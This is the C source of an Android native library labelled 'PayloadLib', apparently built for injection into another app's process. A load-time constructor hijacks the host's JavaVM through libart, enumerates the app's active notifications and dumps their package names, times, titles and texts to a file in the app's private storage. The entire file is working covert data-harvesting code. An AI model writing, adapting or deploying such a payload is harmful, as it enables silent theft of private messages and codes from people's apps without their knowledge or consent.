#include <jni.h>
#include <dlfcn.h>
#include <stdio.h>
#include <android/log.h>
#include "address_finder.h"

#define LOG_TAG "PayloadLib"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

JNIEnv *g_env = NULL;
jclass g_classLoaderClass;
jmethodID g_loadClassMethod;
jobject g_classLoaderObj;

typedef jint (*JNI_GetCreatedJavaVMs_t)(JavaVM **, jsize, jsize *);


void get_notif(jobject context);

__attribute__((constructor)) void init_lib(void) {
    uintptr_t libart_base = find_module_base(0, "libart.so");
    if (!libart_base) return;

    uintptr_t offset = find_created_vms_offset();

    JNI_GetCreatedJavaVMs_t get_vms = (JNI_GetCreatedJavaVMs_t) ((char *) libart_base + offset);

    LOGI("[+] Vm Pointer: %p\n", get_vms);

    JavaVM *vm = NULL;
    jsize count = 0;

    if (get_vms(&vm, 1, &count) == JNI_OK && count > 0) {
        LOGI("[+] SUCESS! JavaVM captured: %p\n", vm);

        if ((*vm)->AttachCurrentThread(vm, &g_env, NULL) != JNI_OK) {
            LOGI("[-] Failed to attach current thread.\n");
            return;
        }

        jclass activityThreadClass = (*g_env)->FindClass(g_env, "android/app/ActivityThread");
        if (activityThreadClass == NULL) {
            LOGI("[-] Faio to find android.app.ActivityThread\n");
            (*g_env)->ExceptionClear(g_env);

            return;
        }
        LOGI("[+] SUCCESS Found android.app.ActivityThread\n");

        jmethodID currentAppMethod = (*g_env)->GetStaticMethodID(g_env, activityThreadClass, "currentApplication",
                                                                 "()Landroid/app/Application;");
        jobject appObj = (*g_env)->CallStaticObjectMethod(g_env, activityThreadClass, currentAppMethod);

        if (appObj == NULL) {
            LOGI("[-] AppObj is NULL \n");
            (*g_env)->ExceptionClear(g_env);

            return;
        }
        LOGI("[+] AppObj is Sucess!\n");

        jclass appClass = (*g_env)->GetObjectClass(g_env, appObj);
        jmethodID getClassLoaderMethod = (*g_env)->GetMethodID(g_env, appClass, "getClassLoader",
                                                               "()Ljava/lang/ClassLoader;");
        g_classLoaderObj = (*g_env)->CallObjectMethod(g_env, appObj, getClassLoaderMethod);

        g_classLoaderClass = (*g_env)->GetObjectClass(g_env, g_classLoaderObj);
        g_loadClassMethod = (*g_env)->GetMethodID(g_env, g_classLoaderClass, "loadClass",
                                                  "(Ljava/lang/String;)Ljava/lang/Class;");

        get_notif(appObj);
    }
}

static void dump_extra_f(FILE *out, int idx, jobject bundle, jclass bundleClass,
                         const char *key, const char *label) {
    jmethodID getCS = (*g_env)->GetMethodID(g_env, bundleClass, "getCharSequence",
        "(Ljava/lang/String;)Ljava/lang/CharSequence;");
    if (getCS == NULL) { (*g_env)->ExceptionClear(g_env); return; }

    jstring jkey = (*g_env)->NewStringUTF(g_env, key);
    jobject cs = (*g_env)->CallObjectMethod(g_env, bundle, getCS, jkey);
    (*g_env)->DeleteLocalRef(g_env, jkey);
    if (cs == NULL) {
        LOGI("    %s: (null)", label);
        return;
    }

    jclass csClass = (*g_env)->GetObjectClass(g_env, cs);
    jmethodID toStr = (*g_env)->GetMethodID(g_env, csClass, "toString",
        "()Ljava/lang/String;");
    jstring s = (jstring)(*g_env)->CallObjectMethod(g_env, cs, toStr);
    const char *utf = (*g_env)->GetStringUTFChars(g_env, s, NULL);

    LOGI("    %s: %s", label, utf ? utf : "(err)");

    if (out != NULL && utf != NULL) {
        fprintf(out, "notif.%d.%s=", idx, label);
        for (const char *p = utf; *p; p++) {
            char c = (*p == '\n' || *p == '\r') ? ' ' : *p;
            fputc(c, out);
        }
        fputc('\n', out);
    }

    (*g_env)->ReleaseStringUTFChars(g_env, s, utf);
    (*g_env)->DeleteLocalRef(g_env, s);
    (*g_env)->DeleteLocalRef(g_env, csClass);
    (*g_env)->DeleteLocalRef(g_env, cs);
}

static jclass load_app_class(const char *dotName) {
    jstring jname = (*g_env)->NewStringUTF(g_env, dotName);
    jclass cls = (jclass)(*g_env)->CallObjectMethod(
        g_env, g_classLoaderObj, g_loadClassMethod, jname);
    (*g_env)->DeleteLocalRef(g_env, jname);
    if ((*g_env)->ExceptionCheck(g_env)) {
        (*g_env)->ExceptionDescribe(g_env);
        (*g_env)->ExceptionClear(g_env);
        return NULL;
    }
    return cls;
}

void get_notif(jobject context) {
    
    // NotificationManager = context.getSystemService("notification")
    jclass ctxClass = (*g_env)->GetObjectClass(g_env, context);
    jmethodID getSvc = (*g_env)->GetMethodID(g_env, ctxClass, "getSystemService",
        "(Ljava/lang/String;)Ljava/lang/Object;");
    jstring svcName = (*g_env)->NewStringUTF(g_env, "notification");
    jobject nm = (*g_env)->CallObjectMethod(g_env, context, getSvc, svcName);
    (*g_env)->DeleteLocalRef(g_env, svcName);
    if (nm == NULL) { LOGE("getSystemService null"); return; }

    // StatusBarNotification[] = nm.getActiveNotifications()
    jclass nmClass = (*g_env)->GetObjectClass(g_env, nm);
    jmethodID getActive = (*g_env)->GetMethodID(g_env, nmClass,
        "getActiveNotifications",
        "()[Landroid/service/notification/StatusBarNotification;");
    if (getActive == NULL) {
        (*g_env)->ExceptionClear(g_env);
        LOGE("getActiveNotifications not found"); return;
    }

    jobjectArray sbnArray = (jobjectArray)(*g_env)->CallObjectMethod(g_env, nm, getActive);
    if (sbnArray == NULL) { LOGE("array null"); return; }

    jsize count = (*g_env)->GetArrayLength(g_env, sbnArray);
    LOGI("=== %d active notifications ===", count);

    jclass sbnClass = load_app_class("android.service.notification.StatusBarNotification");
    jmethodID getId = (*g_env)->GetMethodID(g_env, sbnClass, "getId", "()I");
    jmethodID getPackage = (*g_env)->GetMethodID(g_env, sbnClass, "getPackageName", "()Ljava/lang/String;");
    jmethodID getNotif = (*g_env)->GetMethodID(g_env, sbnClass, "getNotification", "()Landroid/app/Notification;");

    jclass notifClass = load_app_class("android.app.Notification");
    jfieldID extrasField = (*g_env)->GetFieldID(g_env, notifClass, "extras", "Landroid/os/Bundle;");


    jmethodID getFilesDir = (*g_env)->GetMethodID(g_env, ctxClass, "getFilesDir",
        "()Ljava/io/File;");
    jobject fileObj = (*g_env)->CallObjectMethod(g_env, context, getFilesDir);

    jclass fileClass = (*g_env)->GetObjectClass(g_env, fileObj);
    jmethodID getAbsPath = (*g_env)->GetMethodID(g_env, fileClass, "getAbsolutePath",
        "()Ljava/lang/String;");
    jstring pathStr = (jstring)(*g_env)->CallObjectMethod(g_env, fileObj, getAbsPath);

    const char *dir = (*g_env)->GetStringUTFChars(g_env, pathStr, NULL);

    char out_tmp[512], out_final[512];
    snprintf(out_tmp, sizeof(out_tmp), "%s/notif_dump.txt.tmp", dir);
    snprintf(out_final, sizeof(out_final), "%s/notif_dump.txt", dir);

    (*g_env)->ReleaseStringUTFChars(g_env, pathStr, dir);

    FILE *out = fopen(out_tmp, "w");
    if (out == NULL) {
        LOGE("[-] fopen failed for %s", out_tmp);
    }

    if (out != NULL) {
        fprintf(out, "dump_count=%d\n", count);
    }

    for (jsize i = 0; i < count; i++) {
        jobject sbn = (*g_env)->GetObjectArrayElement(g_env, sbnArray, i);

        jint id = (*g_env)->CallIntMethod(g_env, sbn, getId);
        jstring pkg = (jstring)(*g_env)->CallObjectMethod(g_env, sbn, getPackage);
        const char *pkgUtf = (*g_env)->GetStringUTFChars(g_env, pkg, NULL);

        jmethodID getPostTime = (*g_env)->GetMethodID(g_env, sbnClass, "getPostTime", "()J");

        jlong postTime = (*g_env)->CallLongMethod(g_env, sbn, getPostTime);
        LOGI("[%d] post_time=%lld", i, (long long)postTime);
        if (out != NULL) {
            fprintf(out, "notif.%d.post_time_ms=%lld\n", i, (long long)postTime);
        }

        LOGI("[%d] id=%d pkg=%s", i, id, pkgUtf ? pkgUtf : "?");
        if (out != NULL) {
            fprintf(out, "notif.%d.id=%d\n", i, id);
            fprintf(out, "notif.%d.package_name=%s\n", i, pkgUtf ? pkgUtf : "");
        }

        (*g_env)->ReleaseStringUTFChars(g_env, pkg, pkgUtf);
        (*g_env)->DeleteLocalRef(g_env, pkg);

        jobject notif = (*g_env)->CallObjectMethod(g_env, sbn, getNotif);

        jfieldID flagsField = (*g_env)->GetFieldID(g_env, notifClass, "flags", "I");

        jint flags = (*g_env)->GetIntField(g_env, notif, flagsField);
        int is_summary = (flags & 0x00000200) ? 1 : 0;   // FLAG_GROUP_SUMMARY = 0x200
        if (out != NULL) {
            fprintf(out, "notif.%d.is_group_summary=%s\n", i, is_summary ? "true" : "false");
        }

        jobject extras = (*g_env)->GetObjectField(g_env, notif, extrasField);
        if (extras != NULL) {
            jclass bundleClass = (*g_env)->GetObjectClass(g_env, extras);

            dump_extra_f(out, i, extras, bundleClass, "android.title", "title");
            dump_extra_f(out, i, extras, bundleClass, "android.text", "text");
            (*g_env)->DeleteLocalRef(g_env, bundleClass);
            (*g_env)->DeleteLocalRef(g_env, extras);
        }
        (*g_env)->DeleteLocalRef(g_env, notif);
        (*g_env)->DeleteLocalRef(g_env, sbn);
    }

    if (out != NULL) {
        fclose(out);
        if (rename(out_tmp, out_final) != 0) {
            LOGE("[-] rename failed");
        } else {
            LOGI("[+] dump written to %s", out_final);
        }
    }

    if ((*g_env)->ExceptionCheck(g_env)) {
        (*g_env)->ExceptionDescribe(g_env);
        (*g_env)->ExceptionClear(g_env);
    }
}
